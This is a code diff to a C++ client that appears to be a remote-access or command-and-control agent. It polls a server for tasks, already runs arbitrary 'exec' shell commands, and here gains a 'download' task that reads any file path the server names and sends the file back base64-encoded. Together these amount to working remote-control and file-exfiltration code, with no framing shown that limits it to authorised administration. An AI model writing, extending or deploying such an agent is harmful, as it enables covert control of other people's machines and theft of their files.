@@ -6,6 +6,8 @@
 #include <vector>
 #include <regex>
 #include <cstdio>
+#include <fstream>
+#include <sstream>
 
 std::vector<CommandInfo> fetchPendingCommands(const Config& cfg) {
     std::vector<CommandInfo> cmds;
@@ -21,12 +23,20 @@ std::vector<CommandInfo> fetchPendingCommands(const Config& cfg) {
         ci.id = m[1];
         ci.type = m[2];
         ci.command = "";
+        ci.path = "";
         if (ci.type == "exec") {
             std::regex cmdRe(R"("command"\s*:\s*"([^"]*)")");
             std::smatch cmdM;
             std::string remaining = resp.substr(m.position());
             if (std::regex_search(remaining, cmdM, cmdRe)) {
                 ci.command = cmdM[1];
+            }
+        } else if (ci.type == "download") {
+            std::regex pathRe(R"("path"\s*:\s*"([^"]*)")");
+            std::smatch pathM;
+            std::string remaining = resp.substr(m.position());
+            if (std::regex_search(remaining, pathM, pathRe)) {
+                ci.path = pathM[1];
             }
         }
         cmds.push_back(ci);
@@ -64,6 +74,28 @@ static std::string execCommandCapture(const std::string& cmd) {
     return output;
 }
 
+static std::string base64Encode(const std::vector<unsigned char>& data) {
+    static const char* b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    std::string out;
+    int val = 0, valb = -6;
+    for (unsigned char c : data) {
+        val = (val << 8) + c;
+        valb += 8;
+        while (valb >= 0) {
+            out.push_back(b64chars[(val >> valb) & 0x3F]);
+            valb -= 6;
+        }
+    }
+    if (valb > -6) out.push_back(b64chars[((val << 8) >> (valb + 8)) & 0x3F]);
+    while (out.size() % 4) out.push_back('=');
+    return out;
+}
+
+static std::string basenameOf(const std::string& path) {
+    size_t pos = path.find_last_of("\\/");
+    return (pos == std::string::npos) ? path : path.substr(pos + 1);
+}
+
 void processCommands(const Config& cfg) {
     auto cmds = fetchPendingCommands(cfg);
     for (const auto& cmd : cmds) {
@@ -72,6 +104,23 @@ void processCommands(const Config& cfg) {
         std::string error;
         if (cmd.type == "exec") {
             result = execCommandCapture(cmd.command);
+        } else if (cmd.type == "download") {
+            if (cmd.path.empty()) {
+                error = "missing path payload";
+            } else {
+                std::ifstream file(cmd.path, std::ios::binary);
+                if (!file) {
+                    error = "cannot read file: " + cmd.path;
+                } else {
+                    std::vector<unsigned char> data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+                    std::string b64 = base64Encode(data);
+                    std::ostringstream oss;
+                    oss << "{\"name\":\"" << escapeJson(basenameOf(cmd.path)) << "\","
+                        << "\"content\":\"" << b64 << "\","
+                        << "\"size\":\"" << data.size() << "\"}";
+                    result = oss.str();
+                }
+            }
         } else {
             error = "Unsupported command type: " + cmd.type;
         }
